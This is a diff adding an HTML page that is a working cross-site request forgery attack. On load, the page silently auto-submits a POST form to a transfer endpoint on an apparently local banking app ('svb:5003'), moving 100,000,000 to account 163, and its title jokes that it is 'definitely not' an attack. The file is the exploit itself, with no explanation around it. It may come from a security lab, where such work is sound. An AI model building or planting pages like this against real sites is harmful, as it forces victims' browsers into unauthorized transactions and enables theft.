@@ -1,0 +1,18 @@
+<html>
+  <head>
+    <title>Definetly not a CSRF attck</title>
+  </head>
+  <body onload="submitForm()">
+    <form action="http://svb:5003/transfer/1" method="POST" id="transfer_form" name="transfer_form">
+      <input type="text" name="account" value="163" />
+      <input type="text" name="amount" value="100000000" />
+      <input type="submit" value="Submit">
+    </form>
+
+    <script>
+        function submitForm() {
+            document.getElementById("transfer_form").submit();
+        }
+    </script>
+  </body>
+</html>
